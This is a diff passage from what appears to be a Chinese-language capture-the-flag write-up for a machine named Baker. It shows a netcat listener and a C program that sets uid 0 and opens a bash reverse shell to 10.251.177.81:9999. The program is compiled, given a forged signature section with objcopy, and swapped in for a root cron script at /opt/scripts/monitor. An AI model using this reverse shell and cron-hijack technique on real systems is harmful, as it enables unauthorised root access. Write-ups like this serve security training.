@@ -603,4 +603,23 @@ user.txt
 └─$ nc -lvp 9999
 listening on [any] 9999 ...
 ```
-然后就直接重新写一个monitor文件，添加特定的签名进去，里面写上我们的恶意dai'm
+然后就直接重新写一个monitor文件，添加特定的签名进去，里面写上我们的恶意代码，然后就可以等定时任务执行了：
+```bash
+carol@Baker:~$ cat > /tmp/exploit.c << 'EOF'
+#include <unistd.h>
+#include <stdlib.h>
+
+int main() {
+    setuid(0);
+    setgid(0);
+    system("bash -c 'bash -i >& /dev/tcp/10.251.177.81/9999 0>&1'");
+    return 0;
+}
+EOF
+carol@Baker:~$ gcc /tmp/exploit.c -o /tmp/monitor_bin
+carol@Baker:~$ echo "Maze-Sec-Internal-Only" > /tmp/sig
+carol@Baker:~$ objcopy --add-section .note.sig=/tmp/sig --set-section-flags .note.sig=alloc,readonly /tmp/monitor_bin /tmp/monitor_signed
+objcopy: /tmp/monitor_signed: warning: allocated section `.note.sig' not in segment
+carol@Baker:~$ cp /tmp/monitor_signed /opt/scripts/monitor
+carol@Baker:~$ chmod +x /opt/scripts/monitor
+```
